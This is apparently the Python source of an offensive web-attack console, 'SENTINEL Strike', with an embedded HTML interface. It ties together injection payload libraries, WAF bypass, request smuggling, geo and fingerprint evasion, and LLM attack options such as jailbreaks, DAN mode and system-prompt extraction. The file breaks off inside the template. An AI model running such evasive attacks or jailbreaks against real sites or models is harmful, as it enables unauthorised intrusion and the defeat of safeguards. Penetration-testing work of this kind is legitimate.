#!/usr/bin/env python3
"""
SENTINEL Strike v3.0 — Web Attack Console

Full web interface for penetration testing with all engines:
- WAF Bypass (20+ techniques)
- Advanced Stealth (TLS, timing, headers)
- Geo IP Evasion (16 countries)
- Block Detection & Auto-Evasion
- Custom payload injection
- Real-time attack monitoring
"""

from strike.payloads import (
    SQLI_PAYLOADS,
    XSS_PAYLOADS,
    LFI_PAYLOADS,
    SSRF_PAYLOADS,
    CMDI_PAYLOADS,
    SSTI_PAYLOADS,
    XXE_PAYLOADS,
    NOSQL_PAYLOADS,
    AUTH_BYPASS_HEADERS,
    get_payload_counts,
)
from strike.stealth.geo_evasion import (
    GeoIPEvasion,
    GeoStealthSession,
    ZOOGVPN_SERVERS,
    COUNTRY_PROFILES,
)
from strike.stealth.advanced_stealth import (
    AdvancedStealthSession,
    StealthConfig,
    BrowserProfile,
    HumanTiming,
    USER_AGENTS,
)
from strike.evasion import (
    WAFBypass,
    HTTPBypass,
    BlockDetector,
    EvasionEngine,
    EnterpriseBypass,
    EnterpriseBypassConfig,
    create_enterprise_bypass,
    AdvancedEvasionEngine,
    EliteBypass,
    create_advanced_evasion,
    UltimatePayloadMutator,
    create_mutator,
    # New bypass modules
    WAFFingerprinter,
    fingerprinter,
    AdaptivePayloadEngine,
    adaptive_engine,
    AdvancedSmuggling,
    smuggling,
    MLBypassSelector,
    ml_selector,
)
from strike.evasion.residential_proxy import (
    ResidentialProxyManager,
    ProxyConfig,
    ProxyProvider,
    create_scraperapi_proxy,
)
from urllib.parse import quote, urljoin, urlparse
from aiohttp_socks import ProxyConnector
import aiohttp
import queue
import threading
from flask_cors import CORS
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    jsonify,
    Response,
)
import asyncio
import json
import sys
import os
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List

# Add paths
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))


# Import Strike modules

# LLM Manager for AI-powered attack planning
try:
    from strike.ai import StrikeLLMManager, EXPLOIT_EXPERT, WAF_BYPASS_EXPERT

    LLM_AVAILABLE = True
except ImportError:
    LLM_AVAILABLE = False
    StrikeLLMManager = None

# AI Adaptive for honeypot detection
try:
    from strike.ai.ai_adaptive import AIAdaptiveEngine, ThreatLevel

    AI_ADAPTIVE_AVAILABLE = True
except ImportError:
    AI_ADAPTIVE_AVAILABLE = False
    AIAdaptiveEngine = None
    ThreatLevel = None


# Flask app with template and static folders
DASHBOARD_DIR = Path(__file__).parent
app = Flask(
    __name__,
    template_folder=str(DASHBOARD_DIR / "templates"),
    static_folder=str(DASHBOARD_DIR / "static"),
)

CORS(app)

# Global state
attack_log = queue.Queue()
attack_running = False
attack_results = []

# ============================================================================
# CONFIG LOADER & FILE LOGGER
# ============================================================================

CONFIG_PATH = Path(__file__).parent.parent / "config" / "attack_config.json"
LOG_DIR = Path(__file__).parent.parent / "logs"


def load_default_config() -> Dict:
    """Load default config from attack_config.json."""
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"⚠️ Failed to load config: {e}")
    return {}


DEFAULT_CONFIG = load_default_config()


class AttackLogger:
    """Log attack events to JSONL files for history and analysis."""

    def __init__(self, log_dir: Optional[Path] = None, enabled: bool = True):
        self.enabled = enabled
        # Use LOG_DIR (sentinel-strike/logs) for consistency with report generator
        self.log_dir = log_dir or LOG_DIR
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._create_new_file()

    def _create_new_file(self):
        """Create a new log file with current timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"attack_{timestamp}.jsonl"

    def new_attack(self, target: str = ""):
        """Create new log file for new attack. Call at attack start."""
        self._create_new_file()
        # Log attack info as first entry
        self.log(
            {
                "type": "attack_start",
                "target": target,
                "message": f"New attack started: {target}",
            }
        )
        return self.log_file.name

    def log(self, event: Dict):
        """Append event to JSONL log file."""
        if not self.enabled:
            return
        try:
            event["timestamp"] = datetime.now().isoformat()
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(event, ensure_ascii=False) + "\n")
        except Exception:
            pass

    def get_stats(self) -> Dict:
        """Get current attack stats from log file."""
        stats = {"requests": 0, "blocked": 0, "bypasses": 0, "findings": 0}
        if not self.log_file.exists():
            return stats
        try:
            with open(self.log_file, "r", encoding="utf-8") as f:
                for line in f:
                    event = json.loads(line)
                    event_type = event.get("type", "")
                    if event_type == "request":
                        stats["requests"] += 1
                    elif event_type == "blocked":
                        stats["blocked"] += 1
                    elif event_type == "bypass":
                        stats["bypasses"] += 1
                    elif event_type == "finding":
                        stats["findings"] += 1
        except Exception:
            pass
        return stats


file_logger = AttackLogger()


# ============================================================================
# RECON CACHE (saves scan results to JSON files)
# ============================================================================


class ReconCache:
    """Cache reconnaissance results to avoid expensive repeated scans."""

    def __init__(self, cache_dir: Optional[Path] = None):
        self.cache_dir = cache_dir or Path(__file__).parent / "recon_cache"
        self.cache_dir.mkdir(parents=True, exist_ok=True)

    def _url_to_filename(self, url: str) -> str:
        """Convert URL to safe filename (extract just hostname)."""
        url = url.replace("https://", "").replace("http://", "")
        # Extract just the hostname (remove path and trailing slash)
        url = url.split("/")[0].split(":")[0]
        return f"{url}.json"

    def save(self, url: str, data: dict) -> Path:
        """Save scan results to cache."""
        from datetime import datetime

        data["_cached_at"] = datetime.now().isoformat()
        data["_target"] = url
        filepath = self.cache_dir / self._url_to_filename(url)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return filepath

    def load(self, url: str) -> Optional[dict]:
        """Load cached scan results."""
        filepath = self.cache_dir / self._url_to_filename(url)
        if filepath.exists():
            with open(filepath, "r", encoding="utf-8") as f:
                return json.load(f)
        return None

    def list_cached(self) -> list:
        """List all cached scans."""
        return [f.stem for f in self.cache_dir.glob("*.json")]


recon_cache = ReconCache()


# HTML TEMPLATE
# ============================================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>🥷 SENTINEL Strike v3.0 — Attack Console</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'JetBrains Mono', 'Consolas', monospace;
            background: linear-gradient(135deg, #0d1117 0%, #161b22 50%, #0d1117 100%);
            color: #c9d1d9;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            text-align: center;
            padding: 20px;
            border-bottom: 1px solid #30363d;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 2rem;
            background: linear-gradient(90deg, #ff6b6b, #00d4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 350px 1fr 350px;
            gap: 20px;
            min-height: calc(100vh - 150px);
        }
        
        .panel {
            background: rgba(22, 27, 34, 0.9);
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px;
        }
        
        .panel h2 {
            color: #58a6ff;
            font-size: 1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .panel h2::before {
            content: '';
            width: 8px;
            height: 8px;
            background: #58a6ff;
            border-radius: 50%;
        }
        
        input, select, textarea {
            width: 100%;
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 10px 12px;
            border-radius: 6px;
            font-family: inherit;
            margin-bottom: 10px;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #58a6ff;
        }
        
        label {
            display: block;
            color: #8b949e;
            font-size: 0.85rem;
            margin-bottom: 5px;
        }
        
        .checkbox-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin: 10px 0;
        }
        
        .checkbox-item {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px;
            background: #0d1117;
            border-radius: 6px;
            cursor: pointer;
        }
        
        .checkbox-item:hover {
            background: #161b22;
        }
        
        .checkbox-item input {
            width: auto;
            margin: 0;
        }
        
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-family: inherit;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-attack {
            background: linear-gradient(90deg, #ff6b6b, #ee5a5a);
            color: white;
            font-size: 1.1rem;
        }
        
        .btn-attack:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
        }
        
        .btn-attack:disabled {
            background: #30363d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .btn-secondary {
            background: #21262d;
            color: #c9d1d9;
            margin-top: 10px;
        }
        
        .btn-secondary:hover {
            background: #30363d;
        }
        
        /* Attack Mode Tabs */
        .mode-tab {
            flex: 1;
            padding: 10px;
            background: #21262d;
            border: 1px solid #30363d;
            color: #8b949e;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: all 0.2s;
        }
        
        .mode-tab:hover {
            background: #30363d;
            color: #c9d1d9;
        }
        
        .mode-tab.active {
            background: linear-gradient(90deg, #238636, #2ea043);
            border-color: #238636;
            color: white;
        }
        
        .mode-tab[data-mode="llm"].active {
            background: linear-gradient(90deg, #8957e5, #a371f7);
            border-color: #8957e5;
        }
        
        .mode-tab[data-mode="hybrid"].active {
            background: linear-gradient(90deg, #d29922, #e3b341);
            border-color: #d29922;
        }
        
        /* Console */
        #console {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            height: calc(100% - 50px);
            overflow-y: auto;
            font-size: 0.85rem;
            padding: 15px;
        }
        
        .log-entry {
            padding: 4px 0;
            border-bottom: 1px solid rgba(48, 54, 61, 0.3);
        }
        
        .log-time { color: #8b949e; }
        .log-info { color: #58a6ff; }
        .log-success { color: #3fb950; }
        .log-warning { color: #d29922; }
        .log-error { color: #f85149; }
        .log-attack { color: #ff6b6b; }
        .log-bypass { color: #a371f7; }
        .log-stealth { color: #00d4ff; }
        
        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .stat-box {
            background: #0d1117;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: #58a6ff;
        }
        
        .stat-label {
            font-size: 0.75rem;
            color: #8b949e;
        }
        
        /* Findings */
        .finding {
            background: #0d1117;
            border-left: 3px solid #f85149;
            padding: 12px;
            margin: 10px 0;
            border-radius: 0 6px 6px 0;
        }
        
        .finding.critical { border-color: #f85149; }
        .finding.high { border-color: #d29922; }
        .finding.medium { border-color: #58a6ff; }
        
        .finding-title {
            font-weight: bold;
            color: #f85149;
        }
        
        .finding.high .finding-title { color: #d29922; }
        .finding.medium .finding-title { color: #58a6ff; }
        
        /* Payload editor */
        #custom-payload {
            height: 150px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }
        
        /* Scroll */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0d1117;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 4px;
        }
        
        /* Countries */
        .country-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 5px;
            margin: 10px 0;
        }
        
        .country-btn {
            padding: 8px 5px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            color: #8b949e;
            font-size: 0.75rem;
            cursor: pointer;
        }
        
        .country-btn:hover, .country-btn.active {
            background: #21262d;
            border-color: #58a6ff;
            color: #58a6ff;
        }
        
        /* Browser profiles */
        .browser-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin: 10px 0;
        }
        
        .browser-btn {
            padding: 6px 10px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 4px;
            color: #8b949e;
            font-size: 0.75rem;
            cursor: pointer;
        }
        
        .browser-btn:hover, .browser-btn.active {
            background: #21262d;
            border-color: #00d4ff;
            color: #00d4ff;
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
        }
        
        .tab {
            padding: 8px 15px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            cursor: pointer;
            color: #8b949e;
        }
        
        .tab:hover, .tab.active {
            background: #21262d;
            border-color: #58a6ff;
            color: #58a6ff;
        }
        
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        @media (max-width: 1200px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🥷 SENTINEL Strike v3.0 — Attack Console</h1>
            <p style="color: #8b949e; margin-top: 10px;">WAF Bypass • Advanced Stealth • Geo Evasion • 39,000+ Payloads</p>
        </header>
        
        <div class="grid">
            <!-- LEFT PANEL: Attack Config -->
            <div class="panel">
                <h2>⚙️ Attack Configuration</h2>
                
                <label>Target URL</label>
                <input type="text" id="target" placeholder="https://example.com" value="">
                
                <!-- ATTACK MODE TABS -->
                <label>Attack Mode</label>
                <div style="display:flex;gap:5px;margin-bottom:15px;">
                    <button type="button" class="mode-tab active" data-mode="web" onclick="setAttackMode('web')">🌐 Web</button>
                    <button type="button" class="mode-tab" data-mode="llm" onclick="setAttackMode('llm')">🤖 LLM/AI</button>
                    <button type="button" class="mode-tab" data-mode="hybrid" onclick="setAttackMode('hybrid')">⚡ Hybrid</button>
                </div>
                
                <!-- WEB ATTACK VECTORS -->
                <div id="web-vectors">
                    <label>Web Attack Vectors <small style="color:#8b949e;">(select multiple)</small></label>
                    <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px;max-height:200px;overflow-y:auto;">
                        <div style="margin-bottom:8px;color:#ff6b6b;font-size:0.85rem;">💉 Injection</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="sqli" checked> SQLi</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="xss" checked> XSS</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="cmdi"> CMDi</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="ssti"> SSTI</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="nosql"> NoSQL</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#58a6ff;font-size:0.85rem;">📂 File/Path</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="lfi" checked> LFI</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="ssrf"> SSRF</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="xxe"> XXE</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#3fb950;font-size:0.85rem;">🔍 Enumeration</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="dir_enum"> Dir Enum</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="subdomain"> Subdomain</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="endpoint"> Endpoints</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#d29922;font-size:0.85rem;">🔓 Auth/Access</div>
                        <div class="checkbox-group">
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="auth"> Auth Bypass</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="idor"> IDOR</label>
                            <label class="checkbox-item"><input type="checkbox" name="attack" value="jwt"> JWT</label>
                        </div>
                    </div>
                </div>
                
                <!-- LLM ATTACK VECTORS -->
                <div id="llm-vectors" style="display:none;">
                    <label>LLM Attack Vectors <small style="color:#8b949e;">14 categories, 300+ attacks</small></label>
                    <div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px;max-height:300px;overflow-y:auto;">
                        
                        <div style="margin-bottom:8px;color:#e94560;font-size:0.85rem;">🔓 Jailbreak</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="jailbreak" checked> Jailbreak</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="dan" checked> DAN Mode</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="roleplay"> Roleplay</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="crescendo"> Crescendo</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#4cc9f0;font-size:0.85rem;">💉 Injection</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="direct_inject" checked> Direct</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="indirect_inject"> Indirect (RAG)</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="encoding"> Encoding</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="unicode"> Unicode</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#3fb950;font-size:0.85rem;">🔍 Exfiltration</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="system_prompt" checked> System Prompt</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="pii_extract"> PII Extract</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="training_data"> Training Data</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#d29922;font-size:0.85rem;">🤖 Agentic</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="mcp_tool" checked> MCP Tool Inject</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="a2a_poison"> A2A Poison</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="rag_poison"> RAG Poison</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="capability_esc"> Capability Esc</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#a371f7;font-size:0.85rem;">🔢 Strange Math</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="tda_bypass"> TDA Bypass</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="sheaf_confusion"> Sheaf Confuse</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="chaos_trigger"> Chaos Trigger</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#ff6b6b;font-size:0.85rem;">🎭 Doublespeak</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="doublespeak"> Doublespeak</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="semantic_trap"> Semantic Trap</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#58a6ff;font-size:0.85rem;">🖼️ VLM / Multimodal</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="visual_inject"> Visual Inject</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="cross_modal"> Cross-Modal</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="adversarial_img"> Adversarial Img</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#3fb950;font-size:0.85rem;">🔗 Protocol</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="mcp_protocol"> MCP Protocol</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="a2a_protocol"> A2A Protocol</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="agent_card"> Agent Card</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#d29922;font-size:0.85rem;">☠️ Data Poisoning</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="bootstrap_poison"> Bootstrap</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="temporal_poison"> Temporal</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="synthetic_memory"> Synthetic Mem</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#e94560;font-size:0.85rem;">🧠 Deep Learning</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="activation_attack"> Activation</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="hidden_state"> Hidden State</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="gradient_attack"> Gradient</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#4cc9f0;font-size:0.85rem;">🔬 Advanced Research</div>
                        <div class="checkbox-group" style="margin-bottom:10px;">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="reward_hacking"> Reward Hacking</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="collusion"> Collusion</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="meta_xai"> Meta/XAI</label>
                        </div>
                        
                        <div style="margin-bottom:8px;color:#3fb950;font-size:0.85rem;">🛡️ NLP Guard Bypass</div>
                        <div class="checkbox-group">
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="nlp_bypass"> NLP Guard</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="prompt_guard"> Prompt Guard</label>
                            <label class="checkbox-item"><input type="checkbox" name="llm_attack" value="qwen_guard"> Qwen Guard</label>
                        </div>
                    </div>
                    
                    <!-- LLM ENDPOINT CONFIG -->
                    <label style="margin-top:15px;">LLM Endpoint Type</label>
                    <select id="llm-endpoint-type">
                        <optgroup label="Cloud Providers">
                            <option value="openai">OpenAI (GPT-4, GPT-4o)</option>
                            <option value="gemini" selected>Google Gemini</option>
                            <option value="anthropic">Anthropic Claude</option>
                            <option value="deepseek">DeepSeek</option>
                            <option value="mistral">Mistral AI</option>
                            <option value="groq">Groq (Fast)</option>
                            <option value="together">Together AI</option>
                            <option value="fireworks">Fireworks AI</option>
                        </optgroup>
                        <optgroup label="Local / Self-Hosted">
                            <option value="ollama">Ollama (Local)</option>
                            <option value="lmstudio">LM Studio</option>
                            <option value="vllm">vLLM Server</option>
                            <option value="localai">LocalAI</option>
                        </optgroup>
                        <optgroup label="Other">
                            <option value="chat">Web Chat Interface</option>
                            <option value="custom">Custom API</option>
                        </optgroup>
                    </select>
                    
                    <label>Model</label>
                    <input type="text" id="llm-model" placeholder="gemini-3-pro-flash, gpt-5, claude-4-sonnet..." value="gemini-3-pro-flash">
                </div>
                
                <div style="margin:10px 0;">
                    <button type="button" class="btn-secondary" style="width:auto;padding:5px 10px;font-size:0.8rem;" onclick="selectAllAttacks()">Select All</button>
                    <button type="button" class="btn-secondary" style="width:auto;padding:5px 10px;font-size:0.8rem;" onclick="clearAllAttacks()">Clear All</button>
                </div>
                
                <label>Parameter</label>
                <input type="text" id="param" placeholder="id, q, search, user...">
                
                <div id="custom-payload-section" style="display:none;">
                    <label>Custom Payload</label>
                    <textarea id="custom-payload" placeholder="' OR '1'='1&#10;<script>alert(1)</script>&#10;{{7*7}}"></textarea>
                </div>
                
                <label>Max Payloads per Vector</label>
                <input type="number" id="max-payloads" value="20" min="1" max="100">
                
                <h2 style="margin-top:20px;">🛡️ WAF Bypass</h2>
                <div class="checkbox-group">
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-encoding" checked> Encoding
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-unicode" checked> Unicode
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-comments" checked> Comments
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-case" checked> Case Mix
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-hex" checked> Hex
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="waf-char" checked> CHAR()
                    </label>
                </div>
                
                <label>Bypass Variants per Payload</label>
                <input type="number" id="bypass-variants" value="3" min="0" max="10">
                
                <h2 style="margin-top:20px;">🥷 Stealth Options</h2>
                <div class="checkbox-group">
                    <label class="checkbox-item">
                        <input type="checkbox" id="stealth-timing" checked> Human Timing
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="stealth-fingerprint" checked> FP Rotation
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="stealth-geo" checked> Geo Evasion
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="stealth-detect" checked> Block Detect
                    </label>
                </div>
                
                <label>Base Delay (seconds)</label>
                <input type="number" id="base-delay" value="1.0" min="0.1" max="10" step="0.1">
                
                <label>Browser Profile</label>
                <div class="browser-grid">
                    <button class="browser-btn active" data-browser="chrome_win">Chrome</button>
                    <button class="browser-btn" data-browser="firefox_win">Firefox</button>
                    <button class="browser-btn" data-browser="safari_mac">Safari</button>
                    <button class="browser-btn" data-browser="edge_win">Edge</button>
                    <button class="browser-btn" data-browser="random">Random</button>
                </div>
                
                <label>Geo Country</label>
                <div class="country-grid">
                    <button class="country-btn" data-country="US">🇺🇸 US</button>
                    <button class="country-btn" data-country="GB">🇬🇧 UK</button>
                    <button class="country-btn" data-country="DE">🇩🇪 DE</button>
                    <button class="country-btn" data-country="FR">🇫🇷 FR</button>
                    <button class="country-btn" data-country="JP">🇯🇵 JP</button>
                    <button class="country-btn" data-country="SG">🇸🇬 SG</button>
                    <button class="country-btn active" data-country="auto">🌍 Auto</button>
                    <button class="country-btn" data-country="RU">🇷🇺 RU</button>
                </div>
                
                <h2 style="margin-top:20px;">🔥 Enterprise Mode</h2>
                <div class="checkbox-group">
                    <label class="checkbox-item">
                        <input type="checkbox" id="enterprise-mode"> Enterprise Bypass
                    </label>
                    <label class="checkbox-item">
                        <input type="checkbox" id="use-smuggling"> Request Smuggling
                    </label>
                </div>
                
                <label>Aggression Level: <span id="aggression-value" style="color:#ff6b6b;">5</span>/10</label>
                <input type="range" id="aggression" min="1" max="10" value="5" style="width:100%;" oninput="document.getElementById('aggression-value').textContent=this.value">
                <div style="display:flex;justify-content:space-between;font-size:0.7rem;color:#8b949e;">
                    <span>Silent</span>
                    <span>Medium</span>
                    <span>Brutal</span>
                </div>
                
                <label style="margin-top:10px;">Concurrent Agents: <span id="agents-value" style="color:#00d4ff;">3</span></label>
                <input type="range" id="concurrent-agents" min="1" max="10" value="3" style="width:100%;" oninput="document.getElementById('agents-value').textContent=this.value">
                <div style="display:flex;justify-content:space-between;font-size:0.7rem;color:#8b949e;">
                    <span>1</span>
                    <span>5</span>
                    <span>10</span>
                </div>
                
                <h2 style="margin-top:20px;">🔑 API Keys</h2>
                
                <label>Gemini API Key <a href="https://aistudio.google.com/apikey" target="_blank" style="color:#58a6ff;font-size:0.8rem;">Get key</a></label>
                <input type="password" id="gemini-api-key" placeholder="AIza...">
                
                <label>OpenAI API Key <span style="color:#8b949e;">(for GPT models)</span></label>
                <input type="password" id="openai-api-key" placeholder="sk-...">
                
                <label>ScraperAPI Key <span style="color:#8b949e;">(5K free)</span> <a href="https://www.scraperapi.com/signup" target="_blank" style="color:#58a6ff;font-size:0.8rem;">Get key</a></label>
                <input type="text" id="scraperapi-key" placeholder="Your ScraperAPI key">
                
                <label>Burp Suite Proxy</label>
                <input type="text" id="burp-proxy" placeholder="http://127.0.0.1:8080 (optional)">
                
                <button class="btn-attack" id="btn-start" onclick="startAttack()">
                    🚀 START ATTACK
                </button>
                
                <div style="display:flex;gap:10px;margin-top:10px;">
                    <button class="btn-secondary" style="flex:1;" onclick="stopAttack()">
                        ⏹️ Stop
                    </button>
                    <button class="btn-report" style="flex:1;" onclick="generateReport()">
                        📄 Report
                    </button>
                </div>
            </div>
            
            <!-- CENTER: Console -->
            <div class="panel">
                <h2>📟 Attack Console</h2>
                <div id="console"></div>
            </div>
            
            <!-- RIGHT PANEL: Stats & Findings -->
            <div class="panel">
                <h2>📊 Statistics</h2>
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-value" id="stat-requests">0</div>
                        <div class="stat-label">Requests</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="stat-blocked">0</div>
                        <div class="stat-label">Blocked</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="stat-bypasses">0</div>
                        <div class="stat-label">Bypasses</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="stat-findings">0</div>
                        <div class="stat-label">Findings</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="stat-fingerprints">0</div>
                        <div class="stat-label">FP Rotations</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="stat-geoswitch">0</div>
                        <div class="stat-label">Geo Switches</div>
                    </div>
                </div>
                
                <div style="margin: 15px 0; padding: 10px; background: #0d1117; border-radius: 8px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                        <span style="color: #8b949e;">Current Browser:</span>
                        <span id="current-browser" style="color: #00d4ff;">-</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                        <span style="color: #8b949e;">Current Country:</span>
                        <span id="current-country" style="color: #3fb950;">-</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #8b949e;">WAF Detected:</span>
                        <span id="current-waf" style="color: #f85149;">-</span>
                    </div>
                </div>
                
                <h2>🔓 Findings</h2>
                <div id="findings-list">
                    <p style="color: #8b949e; text-align: center; padding: 20px;">
                        No vulnerabilities found yet
                    </p>
                </div>
                
                <h2 style="margin-top: 20px;">📦 Payload Library</h2>
